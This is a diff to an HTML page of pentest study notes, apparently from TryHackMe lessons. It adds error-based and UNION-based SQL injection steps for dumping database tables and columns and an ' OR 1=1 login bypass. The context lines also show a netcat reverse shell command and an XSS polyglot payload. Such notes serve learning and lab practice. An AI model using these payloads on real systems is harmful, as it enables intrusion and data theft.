@@ -169,12 +169,16 @@
       <ol><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png" style="width:450px;height:280px" alt=""></ol>
       </ol>
       <ol><b>DOM Based XSS</b> 
-
-
       </ol>
       <ol><b>Blind XSS</b>
         <p>Same as stored XSS</p>
       </ol>
+    </p>
+
+    <h2><li>SQL Injection</li></h2>
+    <h3>Error Based</h3>
+    <p>The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).
+
     </p>
   </div>
             <!--  Vulnerability Finding section end here    -->
@@ -273,6 +277,20 @@ nc -e /bin/sh 10.20.14 8080<br>
       <ol><pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</pre></ol>
       <p><b>***</b> View source code and try diffrent methon.</p>
     </P>
+    
+    <h2><li>SQL Injection exploitation</li></h2>
+    <p><ol>Some simple SQL command: <ol>1. database()  -- To see database name.</ol>
+                                    <ol>2. </ol>
+    </ol></p>
+    <h3>Exploit error-based SQL injection</h3>
+    <p>use <i>ORDER BY [random_number]</i> -- To check how many columns exist on that database.<br>
+    use <i>UNION SELECT [col1,col2,...]</i> -- To see vulnerable columns.<br>
+    use <i>UNION SELECT 1,2,database()</i> -- To see database name.<br>
+    use <i>UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '[database_name]'</i> -- To see tables list on that database.<br>
+    use <i>UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '[table_name]'</i> -- To see table first column data.<br>
+    use <i>UNION SELECT 1,2,group_concat([col_name1,':',col_name2,SEPARATOR '&lt;br&gt;') FROM [table_name]</i> -- To see target columns data.<br>
+  </p>
+   <p>bypass common auth vulnerability using: <i>' OR 1=1;-- </i></p>
 </div>
    <!-- Exploitation section end here  -->
 </body>
